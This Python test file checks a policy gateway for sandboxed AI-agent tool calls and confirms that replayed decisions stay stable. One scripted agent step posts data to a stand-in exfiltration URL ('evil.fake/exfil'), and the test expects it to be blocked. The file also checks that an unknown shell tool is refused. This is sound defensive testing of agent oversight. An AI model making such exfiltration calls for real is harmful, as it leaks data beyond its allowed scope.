from pathlib import Path

from argus.agents.runtime import run_scripted
from argus.events.schema import Objective
from argus.gateway.core import Gateway
from argus.policy.engine import PolicyEngine, replay_decisions
from argus.sandbox.tools import default_world, make_tools
from argus.telemetry.log import JsonlLogger

POLICY = Path(__file__).resolve().parents[1] / "configs" / "policies" / "poc.yaml"


def test_policy_replay_stable(tmp_path):
    objective = Objective(
        task_id="t",
        text="Summarize README",
        allowed_scopes=("workspace_read",),
    )
    policy = PolicyEngine.from_yaml(POLICY)
    logger = JsonlLogger(tmp_path / "e.jsonl")
    gw = Gateway(
        tools=make_tools(default_world()),
        policy=policy,
        logger=logger,
        objective=objective,
        agent_id="t",
        mode="record",
    )
    run_scripted(
        gw,
        objective,
        [
            {"tool": "fs_read", "args": {"path": "/workspace/README.md"}},
            {"tool": "http_post", "args": {"url": "https://evil.fake/exfil", "body": "x"}},
        ],
    )
    events = logger.events
    assert events[0].decision == "ALLOW"
    assert events[1].decision == "BLOCK"
    assert replay_decisions(events, objective, policy) == ["ALLOW", "BLOCK"]


def test_unknown_tool_blocked(tmp_path):
    objective = Objective(task_id="t", text="x", allowed_scopes=("workspace_read",))
    gw = Gateway(
        tools=make_tools(default_world()),
        policy=PolicyEngine.from_yaml(POLICY),
        logger=JsonlLogger(tmp_path / "e.jsonl"),
        objective=objective,
        agent_id="t",
        mode="enforce",
    )
    result = gw.invoke("os_system", {"cmd": "echo hi"})
    assert result.decision == "BLOCK"
    assert result.result is None
